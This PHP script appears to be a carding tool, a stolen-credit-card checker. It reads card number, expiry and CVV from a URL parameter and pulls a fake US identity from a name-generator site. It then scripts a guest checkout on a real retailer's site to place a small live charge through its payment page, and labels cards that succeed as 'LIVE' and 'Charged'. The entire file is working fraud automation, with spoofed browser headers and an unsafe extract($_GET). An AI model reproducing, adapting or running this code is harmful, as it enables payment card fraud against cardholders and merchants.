<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 12)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();

    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = GetStr($randomShits, '"street2":', ',"phone"');
    $city = GetStr($local, '"', ',');
    $state = GetStr($local, ', ', ' ');
    $postcode = GetStr($local, $state." ", '"');
    $phone = str_replace("-", "", $data['phone']);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.wisewaysupply.com/product/37024790-mid-size-combination-wallplate-eat-pj226v-3g-midway-2swt-1-dec--1.html',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        )
    ));
    $csrf = GetStr(curl_exec($ch), '<input type="hidden" name="_token" value="', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.wisewaysupply.com/cart/addcart',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            "accept: */*",
            "content-type: application/x-www-form-urlencoded; charset=UTF-8",
            "origin: https://www.wisewaysupply.com",
            "referer: https://www.wisewaysupply.com/product/37024790-mid-size-combination-wallplate-eat-pj226v-3g-midway-2swt-1-dec--1.html",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
            "x-csrf-token: $csrf",
            "x-requested-with: XMLHttpRequest"
        ),
        CURLOPT_POSTFIELDS => "product=%7B%22item_id%22%3A4924728%2C%22item_sku%22%3A%22202100%22%2C%22item_catalog_id%22%3A1135%2C%22item_supplier_id%22%3A1061%2C%22item_is_multiple%22%3A0%2C%22item_minimum_order%22%3A1%2C%22item_maximum_order%22%3A0%2C%22item_is_contract%22%3A0%2C%22item_name%22%3A%22Eaton+combination+wallplate+EAT+PJ226V+3G+MIDWAY+2SWT1-DEC%22%2C%22item_image_thumbnail_path%22%3A%22https%3A%2F%2Fus.evocdn.io%2Fdealer%2F1159%2Fcatalog%2Fproduct%2Fimages%2F%22%2C%22item_image_thumbnail%22%3A%22product_image_coming_soon_1586271637.jpg%22%2C%22item_cost_center_id%22%3A0%2C%22item_department_id%22%3A0%2C%22item_pack%22%3A1%2C%22is_pickup%22%3A1%2C%22branch_id%22%3A%22212%22%2C%22branch_code%22%3A4%2C%22line_ref%22%3A%22%22%7D&qty=1"
    ));
    curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.wisewaysupply.com/cart/addcart',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            "accept: */*",
            "content-type: application/x-www-form-urlencoded; charset=UTF-8",
            "origin: https://www.wisewaysupply.com",
            "referer: https://www.wisewaysupply.com/product/37024790-mid-size-combination-wallplate-eat-pj226v-3g-midway-2swt-1-dec--1.html",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
            "x-csrf-token: $csrf",
            "x-requested-with: XMLHttpRequest"
        ),
        CURLOPT_POSTFIELDS => "product=%7B%22item_id%22%3A4924728%2C%22item_sku%22%3A%22202100%22%2C%22item_catalog_id%22%3A1135%2C%22item_supplier_id%22%3A1061%2C%22item_is_multiple%22%3A0%2C%22item_minimum_order%22%3A1%2C%22item_maximum_order%22%3A0%2C%22item_is_contract%22%3A0%2C%22item_name%22%3A%22Eaton+combination+wallplate+EAT+PJ226V+3G+MIDWAY+2SWT1-DEC%22%2C%22item_image_thumbnail_path%22%3A%22https%3A%2F%2Fus.evocdn.io%2Fdealer%2F1159%2Fcatalog%2Fproduct%2Fimages%2F%22%2C%22item_image_thumbnail%22%3A%22product_image_coming_soon_1586271637.jpg%22%2C%22item_cost_center_id%22%3A0%2C%22item_department_id%22%3A0%2C%22item_pack%22%3A1%2C%22is_pickup%22%3A1%2C%22branch_id%22%3A%22212%22%2C%22branch_code%22%3A4%2C%22line_ref%22%3A%22%22%7D&qty=1"
    ));
    $orderId = GetStr(curl_exec($ch), '"session_id":', ',');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.wisewaysupply.com/ajax/live-inventory?_='.time(),
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            "accept: */*",
            "content-type: application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
            "x-csrf-token: $csrf",
            "x-requested-with: XMLHttpRequest"
        ),
        CURLOPT_POSTFIELDS => "products%5B%5D=202100"
    ));
    $a = urldecode(GetStr(curl_exec($ch), "XSRF-TOKEN=", ";"));
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.wisewaysupply.com/api/checkout-v2/set-user',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            "accept: application/json, text/plain, */*",
            "content-type: application/json;charset=UTF-8",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
            "x-csrf-token: $csrf",
            "x-requested-with: XMLHttpRequest",
            "x-xsrf-token: $a"
        ),
        CURLOPT_POSTFIELDS => '{"name":"'.$fname.' '.$lname.'","phone":"","cell":"'.$phone.'","email":"'.$fname.''.$lname.'@gmail.com","type":"guest"}'
    ));
    $b = urldecode(GetStr(curl_exec($ch), "XSRF-TOKEN=", ";"));
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.wisewaysupply.com/api/checkout-v2/set-addresses',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            "accept: application/json, text/plain, */*",
            "content-type: application/json;charset=UTF-8",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
            "x-csrf-token: $csrf",
            "x-requested-with: XMLHttpRequest",
            "x-xsrf-token: $b"
        ),
        CURLOPT_POSTFIELDS => '{"delivery_address":{"budget_code":null,"city":"Cincinnati","code":null,"country":"US","id":0,"line1":"7650 School Road","line2":"","line3":"","state":"OH","title":"Will Call","zip":"45249","contact_note":""},"billing_address":{"line1":"'.$street.'","line2":"","line3":"","city":"'.$city.'","state":"'.$state.'","hasState":true,"country":"US","zip":"'.$postcode.'","is_saved":false}}'
    ));
    $c = urldecode(GetStr(curl_exec($ch), "XSRF-TOKEN=", ";"));
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.wisewaysupply.com/api/checkout-v2/vantiv-express/charge',
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            "accept: application/json, text/plain, */*",
            "content-type: application/json;charset=UTF-8",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
            "x-csrf-token: $csrf",
            "x-requested-with: XMLHttpRequest",
            "x-xsrf-token: $c"
        ),
        CURLOPT_POSTFIELDS => '{"attempt":1,"user":{"id":null,"pg_id":null,"name":"'.$fname.' '.$lname.'","email":"'.$fname.''.$lname.'@gmail.com","phone":""},"order_id":"'.$orderId.'","billing":{"line1":"'.$street.'","line2":"","line3":"","city":"'.$city.'","state":"'.$state.'","zip":"'.$postcode.'","country":"US"},"delivery":{"line1":"7650 School Road","line2":"","line3":"","city":"Cincinnati","state":"OH","zip":"45249","country":"US","budget_code":null},"amount":1.47,"capture":true}'
    ));
    $fucker = curl_exec($ch);
    curl_close($ch);

    $transactionId = GetStr($fucker, '"transaction_id":"', '"');
    $worldpayUrl = stripslashes(GetStr($fucker, '"iframe_url":"', '"'));

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $worldpayUrl,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
        )
    ));
    $ops = curl_exec($ch);
    curl_close($ch);

    $VIEWSTATE = urlencode(GetStr($ops, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
    $EVENTVALIDATION = urlencode(GetStr($ops, '<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"'));
    $VIEWSTATEGENERATOR = urlencode(GetStr($ops, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"'));

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $worldpayUrl,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
            'X-MicrosoftAjax: Delta=true',
            'X-Requested-With: XMLHttpRequest'
        ),
        CURLOPT_POSTFIELDS => "scriptManager=upFormHP%7CprocessTransactionButton&__EVENTTARGET=processTransactionButton&__EVENTARGUMENT=&__VIEWSTATE=$VIEWSTATE&__VIEWSTATEGENERATOR=$VIEWSTATEGENERATOR&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=$EVENTVALIDATION&hdnCancelled=&cardNumber=$cc&ddlExpirationMonth=$mm&ddlExpirationYear=".substr($yy, 2, 4)."&CVV=$cvv&txtBillingEditName=$fname%20$lname&txtBillingEditAddress1=$street&txtBillingEditAddress2=&txtBillingEditCity=$city&txtBillingEditState=$state&txtBillingEditZip=$postcode&txtBillingEditEmail=&txtBillingEditPhone=&hdnSwipe=&hdnTruncatedCardNumber=&hdnValidatingSwipeForUseDefault=&__ASYNCPOST=true&"
    ));
    $exec = curl_exec($ch);
    curl_close($ch);

    $response = GetStr($exec, '<span class="error">-&nbsp;', '</span>');

    if(strpos($exec, 'HostedPaymentStatus=Complete')) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$response.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    }
    unlink("cookies/$cookie.txt");
?>